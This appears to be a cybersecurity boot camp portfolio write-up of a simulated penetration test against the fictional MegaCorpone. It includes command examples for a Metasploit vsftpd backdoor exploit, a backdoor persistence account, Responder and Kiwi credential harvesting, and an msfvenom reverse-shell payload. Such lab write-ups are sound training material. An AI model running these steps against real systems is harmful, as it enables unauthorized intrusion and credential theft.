# Challenges 16 &amp; 17: MegaCorpone/Offensive Security CTF

## Objective Summary
This project highlights offensive security techniques practiced during the University of California, Irvine's Cybersecurity Boot Camp. It involved simulating penetration testing on the fictional MegaCorpone Corporation to uncover and exploit vulnerabilities within their web application, Linux servers, and Windows servers. The objective was to identify potential security weaknesses and demonstrate real-world offensive security methodologies.
 
## Project Highlights
Key Achievements:
- Conducted vulnerability assessments and penetration tests on MegaCorpone’s web application.
- Exploited misconfigurations and weaknesses in Linux and Windows server environments.
- Delivered actionable security insights and recommendations based on findings.

### Technical Skills Gained
- Web Application Security:
   - Exploited vulnerabilities in web applications using tools like Burp Suite and Metasploit.
   - Applied OWASP principles to address web application threats.
- Server Security:
   - Conducted vulnerability scans and exploited misconfigurations on Linux and Windows servers.
   - Practiced privilege escalation to simulate full system compromise.
- Penetration Testing Methodology:
   - Followed the 5-step penetration testing process: Reconnaissance, Scanning, Gaining Access, Maintaining Access, and Covering Tracks.
   - Used the MITRE ATT&CK Framework to guide structured attack simulations.
- OSINT & Reconnaissance:
   - Utilized OSINT tools like OSINT Framework, Google, and GitHub for information gathering.


### Tools & Environments Used
- <b>Penetration Testing Tools:</b> Metasploit, Searchsploit, MsVenom
- <b>Vulnerability Scanning:</b> Nmap, Zenmap, Nessus
- <b>Web Application Testing:</b> Burp Suite
- <b>OSINT Tools:</b> OSINT Framework, Google, GitHub
- <b>Virtual Environments:</b> Kali Linux, Windows 10, Hyper-V Manager, Azure Windows VMs



## Project Write up
### Summary
Scenario Overview: MegaCorpone, a fictional company, engaged penetration testers to evaluate the security of its web application, Linux, and Windows servers. As they prepared for launch, the goal was to identify and remediate vulnerabilities to ensure a secure deployment.

#### Web Application Vulnerability Testing:
1. Conducted reconnaissance using OSINT tools to gather data about the MegaCorpone web application.
2. Identified web application vulnerabilities using Burp Suite and Nmap/Zenmap.
3. Exploited discovered vulnerabilities using the Metasploit Framework.

#### Linux Server Penetration Testing:
1. Scanned Linux servers for vulnerabilities with Nmap and Nessus.
2. Identified misconfigurations and leveraged exploits via Metasploit.
3. Escalated privileges to simulate full system compromise.

#### Windows Server Penetration Testing:
1. Conducted initial scans to uncover vulnerabilities on Windows servers.
2. Created and deployed custom payloads using MsVenom.
3. Exploited services and tested for privilege escalation vulnerabilities.

### Summary of Project Steps

1. <b>Reconnaissance</b>
- Gathered publicly available information using Google Hacking techniques.
- Identified Megacorpone’s website assets, upper-level management usernames, and sensitive company data.
- Utilized OSINT tools like Shodan.io and Nmap to identify IP addresses, server details, and open ports.

2. <b>Scanning & Enumeration</b>
- Conducted active internet scanning to detect open ports (22, 80, 443) and the server OS (Apache/2.4.62 on Debian).
- Used Nmap to discover two additional Windows machines and their open ports.

3. <b>Exploitation of Linux Server</b>
- Leveraged Nmap scans to identify a vulnerable vsftp 2.3.4 service on port 21.
- Gained unauthorized access to the Linux server using MSFconsole.
- Enumerated stored credentials from system text files.
- Used stolen credentials to SSH into the server for further enumeration.

4. <b>Persistence & Credential Harvesting</b>
- Created a persistent backdoor user account to maintain system access.
- Used MSFconsole and LLMNR protocol to capture additional credentials from the Windows 10 machine.
- Exploited Windows DC machine using MSFvenom and Kiwi tools to extract further login credentials.

5. <b>Lateral Movement & Privilege Escalation</b>
- Used admin credentials to move laterally from Windows 10 to the Domain Controller (WinDC01).
- Successfully gained full access to Megacorpone’s network infrastructure.

### Detailed Project Steps

1. Reconnaissance of Megacorpone

I leveraged publicly available information using Google Hacking techniques to gather company details, including employee usernames and email addresses. Tools such as Shodan.io and Nmap were used to collect IP addresses, open ports, and geolocation data for Megacorpone’s servers. This phase exposed critical information, including:
- Website asset files 
- Employee usernames and emails.
- Server details with open ports (22, 80, 443).

 Google Dorking Example:
- google: site:megacorpone.com intext:email OR filetype:pdf OR filetype:doc

2. Scanning & Enumeration

Using Nmap, two additional Windows machines were detected on the network, revealing:
- Open ports that could be exploited.
- Server OS and running services.

 Nmap Scan Commands Example:
- nmap -sV 172.22.117.150 OR nmap -sS -p 22,80,443 --open -oN initial_scan.txt megacorpone.com


- A deeper Nmap scan revealed that the Linux server was running vsftp 2.3.4, a known vulnerable service that allows unauthorized access.

3. Exploitation of Linux Server
- Used MSFconsole to exploit vsftp 2.3.4 and gain access to the Linux server.
- Located text files containing administrator credentials.
- Used stolen credentials to SSH into the system and extract more user login details.

 MSFconsole Exploitation Example:
- msfconsole -q
- use exploit/unix/ftp/vsftpd_234_backdoor
- set RHOSTS 172.22.117.150
- exploit

 SSH into Linux Server:
- ssh msfadmin@172.22.117.150

 Sample credentials discovered:
- msfadmin: cybersecurity
- tstark: Password!

4. Persistence & Credential Harvesting
- Created a persistent user account (systemmd) to maintain access post-reboot.
- Used MSFconsole in conjunction with LLMNR spoofing to capture Windows 10 login credentials.

 Creating a New User for Persistence Example:
- sudo passwd systemmd OR sudo useradd -m -d /home/systemmd -s /bin/bash systemmd

 Kiwi Tools Example:
- kiwi_cmd lsadump::cache
  
 Capturing Windows Credentials Example:
- sudo responder -I eth1 -v
 
5. Lateral Movement & Privilege Escalation

- Used newly acquired admin credentials (bbanner:Winter2021) to gain access to Windows DC.
- Deployed MSFvenom payloads to escalate privileges and compromise additional systems.

 Generating Payload with MSFvenom Example:
- msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.22.117.20 LPORT=4444 -f exe > shell.exe

 Transferring and Executing Payload Example:
- scp shell.exe administrator@172.22.117.20:C$\Users\Public
- run shell.exe

### Conclusion

CTP, LLC’s penetration test successfully uncovered critical security vulnerabilities in Megacorpone’s infrastructure. The test demonstrated how weak passwords, exposed usernames, unprotected ports, and vulnerable services could be exploited to gain unauthorized access. Addressing these security gaps is imperative to prevent potential cyber threats, data breaches, and ransomware attacks.





